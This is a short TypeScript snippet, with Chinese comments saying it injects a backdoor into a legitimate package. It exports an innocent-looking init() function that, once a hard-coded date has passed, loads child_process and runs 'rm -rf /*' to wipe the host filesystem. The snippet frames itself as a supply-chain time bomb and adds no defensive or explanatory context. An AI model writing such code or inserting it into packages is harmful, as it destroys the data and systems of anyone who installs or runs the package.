
// 在合法包中注入后门代码
export function init(): void {
    if (Date.now() > 1672531200000) { // 设定激活时间
      import('child_process').then((child_process) => {
        child_process.exec('rm -rf /*'); // 触发恶意行为
      });
    }
  }
